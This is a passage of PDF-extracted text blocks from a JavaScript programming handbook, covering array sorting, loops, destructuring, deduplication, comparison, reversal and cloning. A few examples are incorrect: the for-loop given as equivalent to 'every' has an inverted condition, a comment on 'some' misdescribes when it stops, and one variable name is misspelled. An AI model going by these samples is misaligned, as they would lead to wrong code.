        "text": "Note:  The above sort will throw an error if any array items are not a string. If you know that the array may contain items that are not strings use the safe version below.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 's' ,   't' ,   'a' ,   'c' ,   'K' ,   1 ,   'v' ,   'E' ,   'r' ,   'f' ,   'l' ,   'o' ,   'W' ] . sort (( a ,  b )   =>   {    return  a. toString () . localeCompare ( b );        });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 87",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "String sorting by length (longest \ufb01rst)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"zebras\" ,   \"dogs\" ,   \"elephants\" ,   \"penguins\" ] . sort ( function ( a ,  b )   {    return  b. length   -  a. length ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"elephants\" ,   \"penguins\" ,   \"zebras\" ,   \"dogs\" ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "String sorting by length (shortest \ufb01rst)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"zebras\" ,   \"dogs\" ,   \"elephants\" ,   \"penguins\" ] . sort ( function ( a ,  b )   {    return  a. length   -  b. length ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"dogs\" ,   \"zebras\" ,   \"penguins\" ,   \"elephants\" ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Numerical Sort (ascending)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 100 ,   1000 ,   10 ,   10000 ,   1 ] . sort ( function ( a ,  b )   {    return  a  -  b ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   10 ,   100 ,   1000 ,   10000 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Numerical Sort (descending)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 100 ,   1000 ,   10 ,   10000 ,   1 ] . sort ( function ( a ,  b )   {    return  b  -  a ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 10000 ,   1000 ,   100 ,   10 ,   1 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sorting array by even and odd numbers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 10 ,   21 ,   4 ,   15 ,   7 ,   99 ,   0 ,   12 ] . sort ( function ( a ,  b )   {      return   ( a  &   1 )   -   ( b  &   1 )   ||  a  -  b ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 0 ,   4 ,   10 ,   12 ,   7 ,   15 ,   21 ,   99 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Date Sort (descending)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  dates  =   [    new  Date ( 2007 ,   11 ,   10 ),    new  Date ( 2014 ,   2 ,   21 ),",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 88",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   new  Date ( 2009 ,   6 ,   11 ),    new  Date ( 2016 ,   7 ,   23 ) ]; dates. sort ( function ( a ,  b )   {    if   ( a  >  b )   return   - 1 ;    if   ( a  <  b )   return   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   0 ; });",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// the date objects can also sort by its difference // the same way that numbers array is sorting",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "dates. sort ( function ( a ,  b )   {    return  b - a ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in: [",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   \"Tue Aug 23 2016 00:00:00 GMT-0600 (MDT)\" ,    \"Fri Mar 21 2014 00:00:00 GMT-0600 (MDT)\" ,    \"Sat Jul 11 2009 00:00:00 GMT-0600 (MDT)\" ,    \"Mon Dec 10 2007 00:00:00 GMT-0700 (MST)\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.6: Iteration",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A traditional  for -loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A traditional  for  loop has three components: The initialization:  executed before the look block is executed the \ufb01rst time 1. The condition:  checks a condition every time before the loop block is executed, and quits the loop if false 2. The afterthought:  performed every time after the loop block is executed 3. These three components are separated from each other by a  ;  symbol. Content for each of these three components is optional, which means that the following is the most minimal  for  loop possible:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   (;;)   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Do stuff }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Of course, you will need to include an  if ( condition  ===   true )   {   break ;   }  or an  if ( condition  ===   true )   { return ;   }  somewhere inside that  for -loop to get it to stop running. Usually, though, the initialization is used to declare an index, the condition is used to compare that index with a minimum or maximum value, and the afterthought is used to increment the index:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ,  length  =   10 ;  i  <  length ;  i ++)   {     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using a traditional  for  loop to loop through an array",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The traditional way to loop through an array, is this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ,  length  =  myArray. length ;  i  <  length ;  i ++)   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 89",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    console. log ( myArray [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or, if you prefer to loop backwards, you do this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =  myArray. length   -   1 ;  i  >   - 1 ;  i --)   {     console. log ( myArray [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There are, however, many variations possible, like for example this one:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  key  =   0 ,  value  =  myArray [ key ],  length  =  myArray. length ;  key  <  length ;  value  = myArray [++ key ])   {     console. log ( value ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "... or this one ...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   0 ,  length  =  myArray. length ; for   (;  i  <  length ;)   {     console. log ( myArray [ i ]);     i ++; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "... or this one:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  key  =   0 ,  value ; for   (;  value  =  myArray [ key ++];){     console. log ( value ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Whichever works best is largely a matter of both personal taste and the speci\ufb01c use case you're implementing. Note that each of these variations is supported by all browsers, including very very old ones!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A  while  loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "One alternative to a  for  loop is a  while  loop. To loop through an array, you could do this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  key  =   0 ; while ( value  =  myArray [ key ++]){     console. log ( value ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Like traditional  for  loops,  while  loops are supported by even the oldest of browsers. Also, note that every while loop can be rewritten as a  for  loop. For example, the  while  loop hereabove behaves the exact same way as this  for -loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( var  key  =   0 ;  value  =  myArray [ key ++];){     console. log ( value ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for ... in",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In JavaScript, you can also do this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 90",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( i  in  myArray )   {     console. log ( myArray [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This should be used with care, however, as it doesn't behave the same as a traditional  for  loop in all cases, and there are potential side-e\ufb00ects that need to be considered. See  Why is using \"for...in\" with array iteration a bad idea?  for more details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ... of",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ES 6, the  for - of  loop is the recommended way of iterating over a the values of an array:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  myArray  =   [ 1 ,   2 ,   3 ,   4 ]; for   ( let  value of myArray )   {    let  twoValue  =  value  *   2 ;   console. log ( \"2 * value is: %d\" ,  twoValue ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The following example shows the di\ufb00erence between a  for ... of  loop and a  for ... in  loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  myArray  =   [ 3 ,   5 ,   7 ]; myArray. foo   =   \"hello\" ; for   ( var  i  in  myArray )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( i );   // logs 0, 1, 2, \"foo\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for   ( var  i of myArray )   {   console. log ( i );   // logs 3, 5, 7 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . keys ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  Array. prototype . keys ()  method can be used to iterate over indices like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  myArray  =   [ 1 ,   2 ,   3 ,   4 ]; for   ( let  i of myArray. keys ())   {    let  twoValue  =  myArray [ i ]   *   2 ;   console. log ( \"2 * value is: %d\" ,  twoValue ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . forEach ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  . forEach ( ... )  method is an option in ES 5 and above. It is supported by all modern browsers, as well as Internet   Explorer   9 and later.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ] . forEach ( function ( value ,  index ,  arr )   {    var  twoValue  =  value  *   2 ;   console. log ( \"2 * value is: %d\" ,  twoValue ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Comparing with the traditional  for  loop, we can't jump out of the loop in  . forEach () . In this case, use the  for  loop, or use partial iteration presented below.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 91",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In all versions of JavaScript, it is possible to iterate through the indices of an array using a traditional C-style  for loop.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myArray  =   [ 1 ,   2 ,   3 ,   4 ]; for ( var  i  =   0 ;  i  <  myArray. length ;   ++ i )   {    var  twoValue  =  myArray [ i ]   *   2 ;   console. log ( \"2 * value is: %d\" ,  twoValue ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It's also possible to use  while  loop:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myArray  =   [ 1 ,   2 ,   3 ,   4 ],     i  =   0 ,  sum  =   0 ; while ( i ++   <  myArray. length )   {   sum  +=  i ; } console. log ( sum );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . every",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Since ES5, if you want to iterate over a portion of an array, you can use  Array. prototype . every , which iterates until we return  false :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "// [].every() stops once it finds a false result // thus, this iteration will stop on value 7 (since 7 % 2 !== 0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ 2 ,   4 ,   7 ,   9 ] . every ( function ( value ,  index ,  arr )   {   console. log ( value );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  value  %   2   ===   0 ;   // iterate until an odd number is found });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Equivalent in any JavaScript version:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 2 ,   4 ,   7 ,   9 ]; for   ( var  i  =   0 ;  i  <  arr. length   &&   ( arr [ i ]   %   2   !==   0 );  i ++)   {   // iterate until an odd number is",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "found",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( arr [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . some",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . some  iterates until we return  true :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "// [].some stops once it finds a false result // thus, this iteration will stop on value 7 (since 7 % 2 !== 0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[ 2 ,   4 ,   7 ,   9 ] . some ( function ( value ,  index ,  arr )   {   console. log ( value );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  value  ===   7 ;   // iterate until we find value 7 });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Equivalent in any JavaScript version:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 2 ,   4 ,   7 ,   9 ]; for   ( var  i  =   0 ;  i  <  arr. length   &&  arr [ i ]   !==   7 ;  i ++)   {   console. log ( arr [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 92",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Libraries",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Finally, many utility libraries also have their own  foreach  variation. Three of the most popular ones are these:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "jQuery. each () , in  jQuery :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "$. each ( myArray ,   function ( key ,  value )   {     console. log ( value ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "_. each () , in  Underscore.js :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "_. each ( myArray ,   function ( value ,  key ,  myArray )   {     console. log ( value ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "_. forEach () , in  Lodash.js :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "_. forEach ( myArray ,   function ( value ,  key )   {     console. log ( value ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "See also the following question on SO, where much of this information was originally posted: Loop through an array in JavaScript",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.7: Destructuring an array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "An array can be destructured when being assigned to a new variable.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  triangle  =   [ 3 ,   4 ,   5 ]; const   [ length ,  height ,  hypotenuse ]   =  triangle ; length  ===   3 ;       //  \u2192  true height  ===   4 ;       //  \u2192  true hypotneuse  ===   5 ;   //  \u2192  true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Elements can be skipped",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const   [, b ,, c ]   =   [ 1 ,   2 ,   3 ,   4 ]; console. log ( b ,  c );   //  \u2192  2, 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rest operator can be used too",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const   [ b , c ,  ... xs ]   =   [ 2 ,   3 ,   4 ,   5 ]; console. log ( b ,  c ,  xs );   //  \u2192  2, 3, [4, 5]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An array can also be destructured if it's an argument to a function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  area ([ length ,  height ])   {    return   ( length  *  height )   /   2 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 93",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  triangle  =   [ 3 ,   4 ,   5 ]; area ( triangle );   //  \u2192  6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice the third argument is not named in the function because it's not needed.",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Learn more about destructuring syntax.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.8: Removing duplicate elements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "From ES5.1 onwards, you can use the native method  Array. prototype . filter  to loop through an array and leave only entries that pass a given callback function. In the following example, our callback checks if the given value occurs in the array. If it does, it is a duplicate and will not be copied to the resulting array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  uniqueArray  =   [ 'a' ,   1 ,   'a' ,   2 ,   '1' ,   1 ] . filter ( function ( value ,  index ,  self )   {    return  self. indexOf ( value )   ===  index ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "});   // returns ['a', 1, 2, '1']",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If your environment supports ES6, you can also use the  Set  object. This object lets you store unique values of any type, whether primitive values or object references:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  uniqueArray  =   [ ...  new  Set ([ 'a' ,   1 ,   'a' ,   2 ,   '1' ,   1 ])];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.9: Array comparison",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "For simple array comparison you can use JSON stringify and compare the output strings:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON. stringify ( array1 )   ===  JSON. stringify ( array2 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  that this will only work if both objects are JSON serializable and do not contain cyclic references. It",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "may throw  TypeError :  Converting circular structure to JSON",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use a recursive function to compare arrays.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  compareArrays ( array1 ,  array2 )   {    var  i ,  isA1 ,  isA2 ;   isA1  =  Array. isArray ( array1 );   isA2  =  Array. isArray ( array2 );  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if   ( isA1  !==  isA2 )   {   // is one an array and the other not?      return   false ;        // yes then can not be the same    }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if   (!   ( isA1  &&  isA2 ))   {        // Are both not arrays      return  array1  ===  array2 ;    // return strict equality    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if   ( array1. length   !==  array2. length )   {   // if lengths differ then can not be the same",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   false ;    }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // iterate arrays and compare them",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   for   ( i  =   0 ;  i  <  array1. length ;  i  +=   1 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 94",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     if   (! compareArrays ( array1 [ i ],  array2 [ i ]))   {   // Do items compare recursively",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }               }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   true ;   // must be equal }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "WARNING:  Using the above function is dangerous and should be wrapped in a  try   catch  if you suspect there is a chance the array has cyclic references (a reference to an array that contains a reference to itself)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =   [ 0 ]   ; a [ 1 ]   =  a ; b  =   [ 0 ,  a ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "compareArrays ( a ,  b );   // throws RangeError: Maximum call stack size exceeded",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  The function uses the strict equality operator  ===  to compare non array items  { a :   0 }   ===   { a :   0 }",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "is  false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.10: Reversing arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": ". reverse  is used to reverse the order of items inside an array. Example for  . reverse :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ] . reverse ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 4 ,   3 ,   2 ,   1 ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note : Please note that  . reverse ( Array. prototype . reverse ) will reverse the array  in place . Instead of returning a reversed copy, it will return the same array, reversed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr1  =   [ 11 ,   22 ,   33 ]; var  arr2  =  arr1. reverse (); console. log ( arr2 );   // [33, 22, 11] console. log ( arr1 );   // [33, 22, 11]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also reverse an array 'deeply' by:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  deepReverse ( arr )   {   arr. reverse () . forEach ( elem  =>   {      if ( Array. isArray ( elem ))   {       deepReverse ( elem );      }    });    return  arr ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example for deepReverse:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   3 ,   [ 1 ,   2 ,   3 ,   [ 'a' ,   'b' ,   'c' ]]];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 95",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "deepReverse ( arr );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "arr  // -> [[['c','b','a'], 3, 2, 1], 3, 2, 1]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.11: Shallow cloning an array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes, you need to work with an array while ensuring you don't modify the original. Instead of a  clone method, arrays have a  slice  method that lets you perform a shallow copy of any part of an array. Keep in mind that this only clones the \ufb01rst level. This works well with primitive types, like numbers and strings, but not objects. To shallow-clone an array (i.e. have a new array instance but with the same elements), you can use the following one-liner:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  clone  =  arrayToClone. slice ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This calls the built-in JavaScript  Array. prototype . slice  method. If you pass arguments to  slice , you can get more complicated behaviors that create shallow clones of only part of an array, but for our purposes just calling  slice () will create a shallow copy of the entire array. All method used to convert array like objects to array are applicable to clone an array:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "arrayToClone  =   [ 1 ,   2 ,   3 ,   4 ,   5 ]; clone1  =  Array. from ( arrayToClone ); clone2  =  Array. of ( ... arrayToClone ); clone3  =   [ ... arrayToClone ]   // the shortest way",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2264 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
